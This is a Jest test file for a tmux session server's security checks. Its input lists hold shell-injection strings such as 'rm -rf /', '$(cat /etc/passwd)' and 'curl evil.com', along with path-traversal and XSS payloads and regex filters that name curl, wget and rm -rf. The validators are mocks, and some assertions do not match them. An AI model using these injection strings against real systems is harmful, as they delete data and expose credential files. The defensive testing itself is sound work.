import { spawn } from 'child_process';
import request from 'supertest';
import express from 'express';
import { createServer } from 'http';
import helmet from 'helmet';
import cors from 'cors';
import rateLimit from 'express-rate-limit';

// Mock validation function tests
describe('Security Validation Tests', () => {
  let app: express.Application;
  let server: any;

  beforeAll(() => {
    app = express();
    server = createServer(app);
    
    // Apply security middleware
    app.use(helmet());
    app.use(cors());
    app.use(express.json({ limit: '1mb' }));

    // Add basic test routes
    app.get('/test', (req, res) => {
      res.json({ status: 'ok' });
    });
    
    app.post('/test', (req, res) => {
      res.json({ received: true });
    });
  });

  afterAll(() => {
    if (server) {
      server.close();
    }
  });
  describe('Input Sanitization', () => {
    const dangerousInputs = [
      // Command injection attempts
      "session'; rm -rf /tmp; echo 'pwned'",
      "session$(cat /etc/passwd)session",
      "session`whoami`session", 
      "session&&curl evil.com",
      "session|rm -rf /",
      "session\nrm -rf /\n",
      
      // Path traversal attempts
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32",
      "/etc/shadow",
      "/root/.ssh/id_rsa",
      
      // Script injection
      "<script>alert('xss')</script>",
      "javascript:alert('xss')",
      
      // Null bytes and control characters
      "test\x00",
      "test\x01\x02\x03",
      "test\r\n",
      
      // Unicode and encoding attacks
      "test%00",
      "test%2e%2e%2f",
      "test\u0000",
      
      // Extremely long strings
      "x".repeat(10000),
      "a".repeat(1000000)
    ];

    dangerousInputs.forEach((input, index) => {
      it(`should detect dangerous input pattern ${index + 1}: ${input.substring(0, 50)}...`, () => {
        // Test session name validation
        const sessionResult = validateSessionName(input);
        expect(sessionResult.isValid).toBe(false);
        
        // Test message validation  
        const messageResult = validateMessage(input);
        expect(messageResult.isValid).toBe(false);
      });
    });

    it('should allow safe inputs', () => {
      const safeInputs = [
        'test-session',
        'session_01', 
        'hello world',
        'normal message',
        '1234567890',
        'session-with-dashes'
      ];
      
      safeInputs.forEach(input => {
        const sessionResult = validateSessionName(input);
        const messageResult = validateMessage(input);
        
        if (input.length < 100 && !/\s/.test(input)) {
          expect(sessionResult.isValid).toBe(true);
        }
        if (input.length < 1000) {
          expect(messageResult.isValid).toBe(true);
        }
      });
    });
  });

  describe('Network Security', () => {
    let app: express.Application;
    let server: any;

    beforeAll(() => {
      app = express();
      server = createServer(app);
      
      // Apply same security middleware as main server
      app.use(helmet());
      app.use(cors({
        origin: process.env.NODE_ENV === 'production' ? false : "*"
      }));
      app.use(express.json({ limit: '1mb' }));
      
      const limiter = rateLimit({
        windowMs: 15 * 60 * 1000,
        max: 100
      });
      app.use(limiter);
      
      app.get('/test', (req, res) => {
        res.json({ message: 'test' });
      });
    });

    afterAll(() => {
      if (server) server.close();
    });

    it('should enforce CORS policy in production', async () => {
      // Temporarily set production mode
      const originalEnv = process.env.NODE_ENV;
      process.env.NODE_ENV = 'production';
      
      try {
        const response = await request(app)
          .get('/test')
          .set('Origin', 'http://malicious.com');
        
        // In production, CORS should be more restrictive
        expect(response.headers['access-control-allow-origin']).not.toBe('*');
      } finally {
        process.env.NODE_ENV = originalEnv;
      }
    });

    it('should include security headers from helmet', async () => {
      const response = await request(app).get('/test');
      
      expect(response.headers).toHaveProperty('x-dns-prefetch-control', 'off');
      expect(response.headers).toHaveProperty('x-frame-options', 'SAMEORIGIN');
      expect(response.headers).toHaveProperty('x-content-type-options', 'nosniff');
      expect(response.headers).toHaveProperty('x-xss-protection', '0');
    });

    it('should enforce JSON payload size limits', async () => {
      const largePayload = { data: 'x'.repeat(2 * 1024 * 1024) }; // 2MB
      
      await request(app)
        .post('/test')
        .send(largePayload)
        .expect(413); // Payload Too Large
    });
  });

  describe('System Command Security', () => {
    it('should not allow command injection in tmux commands', () => {
      const maliciousCommands = [
        "session'; rm -rf /tmp #",
        "session && whoami",
        "session `cat /etc/passwd`",
        "session $(curl evil.com)",
        "session | rm file"
      ];

      maliciousCommands.forEach(cmd => {
        const result = sanitizeTmuxTarget(cmd);
        expect(result).not.toContain(';');
        expect(result).not.toContain('&');
        expect(result).not.toContain('`');
        expect(result).not.toContain('$');
        expect(result).not.toContain('|');
      });
    });
  });

  describe('Resource Protection', () => {
      it('should handle concurrent connection attempts', async () => {
        // Test multiple simultaneous requests
        const requests = Array(10).fill(null).map(() => 
          request(app).get('/test')
        );
        
        const responses = await Promise.all(requests);
        
        // Most should succeed, some might be rate limited
        const successCount = responses.filter(r => r.status === 200).length;
        const rateLimitedCount = responses.filter(r => r.status === 429).length;
        
        expect(successCount + rateLimitedCount).toBe(10);
        expect(successCount).toBeGreaterThan(0);
      });
    });
});

// Mock validation functions for testing
function validateSessionName(name: string): { isValid: boolean; errors: string[] } {
  const errors: string[] = [];
  
  if (name.length > 100) {
    errors.push('Session name too long');
  }
  
  if (/[;&|`$()]/.test(name)) {
    errors.push('Session name contains dangerous characters');
  }
  
  if (/\.\.\//g.test(name)) {
    errors.push('Session name contains path traversal');
  }
  
  if (/\/etc\/|\/root\/|\/tmp\//g.test(name)) {
    errors.push('Session name contains system paths');
  }
  
  if (name.includes('\x00') || /[\x01-\x08\x0B\x0C\x0E-\x1F]/.test(name)) {
    errors.push('Session name contains control characters');
  }
  
  return {
    isValid: errors.length === 0,
    errors
  };
}

function validateMessage(message: string): { isValid: boolean; errors: string[] } {
  const errors: string[] = [];
  
  if (message.length > 10000) {
    errors.push('Message too long');
  }
  
  if (/[;&|`$()]/.test(message)) {
    errors.push('Message contains dangerous characters');
  }
  
  if (/\.\.\//g.test(message)) {
    errors.push('Message contains path traversal');
  }
  
  if (/\/etc\/|\/root\/|curl |wget |rm -rf/g.test(message)) {
    errors.push('Message contains dangerous commands');
  }
  
  return {
    isValid: errors.length === 0,
    errors
  };
}

function sanitizeTmuxTarget(target: string): string {
  return target
    .replace(/[;&|`$()]/g, '')
    .replace(/\.\.\//g, '')
    .substring(0, 200);
}